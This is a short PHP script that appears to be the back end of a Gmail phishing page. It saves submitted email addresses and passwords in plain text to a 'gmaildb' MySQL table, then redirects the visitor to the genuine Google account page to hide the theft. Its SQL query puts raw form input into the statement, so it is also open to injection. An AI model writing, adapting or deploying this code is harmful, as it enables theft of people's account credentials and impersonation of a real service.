<!-- followint code is for localhost. For hosting the page on a website we have to change the servername, username, password, and database_name variables -->
<?php 
$servername = "localhost";
$username = "root";
$password = "";
$database_name = "gmaildb";

$conn = mysqli_connect($servername, $username, $password, $database_name);

if (!$conn){
    die("Connect failed:" . mysqli_connect_error());
}

if(isset($_POST['save'])){
    $email = $_POST['email'];
    $passw = $_POST['passw'];

    $sql_query = "INSERT INTO users (email, passw) VALUES ('$email', '$passw')";

    if(mysqli_query($conn, $sql_query)){
        // echo "New details entered succesfully";
        header("Location: https://myaccount.google.com/");
    }
    else{
        echo "Error: " . $sql . "" . mysqli_error($conn);
    }

    mysqli_close($conn);
}

?>